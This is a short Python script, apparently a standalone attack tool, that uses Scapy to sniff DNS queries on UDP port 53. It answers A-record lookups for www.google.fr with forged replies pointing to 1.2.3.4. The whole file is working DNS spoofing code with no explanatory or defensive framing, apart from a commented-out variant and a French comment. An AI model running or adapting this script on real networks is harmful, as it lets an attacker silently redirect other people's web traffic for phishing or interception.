#!/usr/bin/python

from scapy.all import *

conf.L3socket =L3RawSocket


def callback(pkt):
    if DNS in pkt[0] and pkt[DNS].opcode == 0:
        if pkt[DNSQR].qtype == 1 and pkt[DNSQR].qname[:-1] == "www.google.fr":
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1,\
                          an=DNSRR(rrname=pkt[DNS][DNSQR].qname, ttl=42, rdata='1.2.3.4'))
            #requete type A + www.google.fr <http://www.google.fr/> 
            #spoofed_pkt = IP(dst=pkt[IP].src, src='1.2.3.4', ttl=42)/DNS(opcode=1)/DNSRR(rdata="1.2.3.4")

            send(spoofed_pkt, verbose=0)
            print pkt[DNSQR].qname, ' A? => ', spoofed_pkt[DNSRR].rdata

sniff(filter="udp dst port 53", prn=callback)
